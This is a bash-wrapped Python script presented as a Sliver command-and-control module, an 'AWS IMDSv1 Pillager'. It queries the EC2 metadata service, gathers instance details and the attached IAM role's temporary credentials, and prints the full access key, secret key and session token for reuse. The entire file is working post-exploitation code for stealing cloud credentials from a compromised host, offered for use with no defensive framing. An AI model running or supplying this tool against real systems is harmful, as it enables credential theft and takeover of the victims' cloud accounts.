#!/bin/bash
# Sliver C2 Module Wrapper: AWS IMDSv1 Pillager
# This script wraps the Python module for use with Sliver

# Check if Python is available
if ! command -v python3 &> /dev/null; then
    echo "[ERROR] Python3 is not installed"
    exit 1
fi

# Run the Python pillager script
python3 - << 'EOF'
#!/usr/bin/env python3
"""
Sliver C2 Module: AWS IMDSv1 Pillager
Exploits IMDSv1 to extract AWS credentials and metadata
"""

import json
import urllib.request
import urllib.error
from datetime import datetime

IMDS_BASE = "http://169.254.169.254"
TIMEOUT = 2

def log(message, level="INFO"):
    """Log message with timestamp"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] [{level}] {message}")

def fetch_metadata(path, base_url=IMDS_BASE):
    """Fetch data from IMDS endpoint"""
    url = f"{base_url}{path}"
    try:
        log(f"Fetching: {url}")
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=TIMEOUT) as response:
            data = response.read().decode('utf-8')
            return data
    except urllib.error.URLError as e:
        log(f"Failed to fetch {url}: {e}", "ERROR")
        return None
    except Exception as e:
        log(f"Unexpected error fetching {url}: {e}", "ERROR")
        return None

def get_instance_metadata():
    """Get basic instance metadata"""
    metadata = {}
    
    endpoints = {
        "instance-id": "/latest/meta-data/instance-id",
        "instance-type": "/latest/meta-data/instance-type",
        "ami-id": "/latest/meta-data/ami-id",
        "hostname": "/latest/meta-data/hostname",
        "local-ipv4": "/latest/meta-data/local-ipv4",
        "public-ipv4": "/latest/meta-data/public-ipv4",
        "availability-zone": "/latest/meta-data/placement/availability-zone",
        "region": "/latest/meta-data/placement/region",
        "mac": "/latest/meta-data/mac",
        "security-groups": "/latest/meta-data/security-groups",
    }
    
    for key, endpoint in endpoints.items():
        data = fetch_metadata(endpoint)
        if data:
            metadata[key] = data
            log(f"Retrieved {key}: {data[:50]}..." if len(data) > 50 else f"Retrieved {key}: {data}")
    
    return metadata

def get_iam_credentials():
    """Extract IAM role credentials from IMDSv1"""
    log("Attempting to extract IAM credentials...")
    
    # Get IAM role name
    role_name = fetch_metadata("/latest/meta-data/iam/security-credentials/")
    if not role_name:
        log("No IAM role found attached to instance", "WARNING")
        return None
    
    role_name = role_name.strip().rstrip('/')
    log(f"Found IAM role: {role_name}")
    
    # Get credentials for the role
    creds_path = f"/latest/meta-data/iam/security-credentials/{role_name}"
    creds_data = fetch_metadata(creds_path)
    
    if not creds_data:
        log("Failed to retrieve IAM credentials", "ERROR")
        return None
    
    try:
        creds = json.loads(creds_data)
        log("Successfully extracted IAM credentials!", "SUCCESS")
        
        # Sanitize output for logging
        safe_creds = {
            "AccessKeyId": creds.get("AccessKeyId", "")[:10] + "..." if creds.get("AccessKeyId") else "",
            "SecretAccessKey": "***REDACTED***",
            "Token": "***REDACTED***",
            "Expiration": creds.get("Expiration", ""),
            "Type": creds.get("Type", "")
        }
        log(f"Credentials summary: {json.dumps(safe_creds, indent=2)}")
        
        return creds
    except json.JSONDecodeError as e:
        log(f"Failed to parse credentials JSON: {e}", "ERROR")
        return None

def main():
    """Main execution function"""
    log("=" * 60)
    log("AWS IMDSv1 Pillager - Sliver C2 Module")
    log("=" * 60)
    
    # Check if IMDS is accessible
    test = fetch_metadata("/latest/")
    if not test:
        log("IMDS is not accessible from this host!", "CRITICAL")
        log("Possible reasons:")
        log("  - IMDSv2 is enforced (token required)")
        log("  - Network/firewall blocking access to 169.254.169.254")
        log("  - Not running on AWS EC2 instance")
        return
    
    log("IMDSv1 is accessible! Starting pillage operation...")
    
    results = {}
    
    # Gather all metadata
    log("\n[+] Gathering instance metadata...")
    instance_meta = get_instance_metadata()
    if instance_meta:
        for key, value in instance_meta.items():
            print(f"[METADATA] {key}: {value}")
    
    log("\n[+] Extracting IAM credentials...")
    credentials = get_iam_credentials()
    if credentials:
        log("\n*** CRITICAL FINDING ***", "CRITICAL")
        log("IAM credentials successfully extracted!", "CRITICAL")
        print("\n[!] EXTRACTED AWS CREDENTIALS:")
        print(f"AWS_ACCESS_KEY_ID={credentials.get('AccessKeyId', '')}")
        print(f"AWS_SECRET_ACCESS_KEY={credentials.get('SecretAccessKey', '')}")
        print(f"AWS_SESSION_TOKEN={credentials.get('Token', '')}")
        print(f"Expiration={credentials.get('Expiration', '')}")
        print("\nTest with: aws sts get-caller-identity")

if __name__ == "__main__":
    main()
EOF